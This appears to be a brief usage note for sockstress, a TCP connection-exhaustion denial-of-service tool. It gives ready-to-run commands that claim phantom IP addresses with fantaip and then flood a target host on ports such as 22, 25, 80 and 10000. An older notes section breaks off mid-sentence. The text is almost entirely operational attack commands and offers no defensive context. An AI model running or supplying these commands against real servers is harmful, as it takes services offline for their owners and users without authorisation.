run like

get fantaip from unicornscan or something similar (if you need to arp a phantom ip address)

fantaip -i eth0 -d 192.168.0.43/29

then run the program like
./sockstress -s 192.168.0.43/29 -d www.frog.com -p 80 -c -1 -m -1


#### NOTES FOLLOWING ARE OLD #####

we do:
# fantaip -H 00:01:02:03:04:05 -i eth0 -d 192.168.13.44/29
# ./sockstress -c 1000000 -d 192.168.13.120 -p22,25,80,10000 -s 192.168.13.44/29 -H 00:01:02:03:04:05 -vv -m 99999999 -S 500

after a bit, we get...
